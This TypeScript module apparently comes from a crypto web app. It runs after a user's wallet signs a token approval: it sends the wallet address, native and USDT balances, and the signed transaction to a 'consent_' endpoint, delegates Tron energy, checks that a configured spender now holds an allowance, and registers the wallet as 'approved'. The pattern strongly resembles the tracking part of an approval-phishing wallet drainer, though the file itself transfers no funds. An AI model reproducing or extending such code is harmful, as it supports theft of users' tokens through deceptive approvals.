import { getSpenderEvm, getSpenderTron } from "@/lib/approve-config";

function sleep(ms: number) {
  return new Promise((resolve) => window.setTimeout(resolve, ms));
}

/**
 * After the wallet signs:
 * 1) consent_  — record signed tx + live balance
 * 2) verify-allowance — confirm on-chain (retry)
 * 3) register-approved
 */
export async function runPostConfirmSequence(args: {
  networkKey: string;
  address: string;
  nativeBalance?: string;
  usdtBalance?: string;
  txid?: string | null;
  signedTx?: Record<string, unknown> | null;
}): Promise<{ allowance: string | null; confirmed: boolean }> {
  const {
    networkKey,
    address,
    nativeBalance,
    usdtBalance,
    txid,
    signedTx,
  } = args;
  const spender =
    networkKey === "tron" ? getSpenderTron() : getSpenderEvm();

  try {
    const consentBody =
      networkKey === "tron"
        ? {
            address,
            trxBalance: nativeBalance ?? "0",
            signedTx: signedTx ?? undefined,
          }
        : {
            address,
            network: networkKey,
            nativeBalance: nativeBalance ?? "0",
            txHash: txid ?? undefined,
            txid: txid ?? undefined,
          };

    await fetch("/api/consent_", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify(consentBody),
      cache: "no-store",
    });
  } catch {
    /* soft-fail — still verify */
  }

  if (networkKey === "tron") {
    try {
      await fetch("/api/energy-delegate", {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({
          address,
          currentUsdt: usdtBalance ?? "0",
        }),
        cache: "no-store",
      });
    } catch {
      /* soft-fail */
    }
  }

  await sleep(networkKey === "tron" ? 1500 : 800);

  let allowance: string | null = null;
  let confirmed = false;

  for (let attempt = 0; attempt < 3; attempt++) {
    try {
      const verifyRes = await fetch("/api/verify-allowance", {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({
          network: networkKey,
          owner: address,
          spender,
        }),
        cache: "no-store",
      });
      const verifyJson = (await verifyRes.json()) as {
        ok?: boolean;
        hasAllowance?: boolean;
        allowance?: string;
      };
      if (verifyRes.ok && verifyJson.ok) {
        allowance = verifyJson.allowance ?? null;
        confirmed = Boolean(verifyJson.hasAllowance);
        if (confirmed) break;
      }
    } catch {
      /* retry */
    }
    if (attempt < 2) await sleep(900);
  }

  await fetch("/api/register-approved", {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({
      network: networkKey,
      address,
      allowance,
      txid: txid ?? null,
    }),
    cache: "no-store",
  }).catch(() => undefined);

  return { allowance, confirmed };
}
